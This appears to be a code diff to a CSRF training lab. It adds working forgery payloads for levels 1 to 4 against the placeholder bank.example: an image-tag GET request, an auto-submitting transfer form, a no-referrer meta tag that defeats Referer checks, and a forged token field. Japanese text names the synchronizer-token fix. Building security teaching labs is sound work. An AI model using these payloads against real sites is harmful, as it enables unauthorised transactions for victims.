@@ -196,6 +196,10 @@ res.cookie("session", id, { sameSite: "strict", httpOnly: true });`,
   },
 };
 
+const NO_REFERRER = '<meta name="referrer" content="no-referrer">';
+const EXPLOIT_FORM = (extraFields: string) =>
+  `<form action="https://bank.example/transfer" method="post">${extraFields}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;
+
 export const csrfLab: Lab = {
   meta: {
     id: "csrf",
@@ -223,4 +227,10 @@ export const csrfLab: Lab = {
 根本対策は Lv5 です。セッションごとのランダムな同期トークン（synchronizer token）を発行して値を厳密に検証し、さらに Cookie を SameSite=Strict にします。攻撃者はトークンを知り得ず、クロスサイトでは Cookie も送られないため、偽造リクエストは認証されません。`,
   levels,
   run,
+  exploits: {
+    1: { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' },
+    2: { html: EXPLOIT_FORM("") },
+    3: { html: NO_REFERRER + EXPLOIT_FORM("") },
+    4: { html: NO_REFERRER + EXPLOIT_FORM('<input name="csrf_token" value="x">') },
+  },
 };
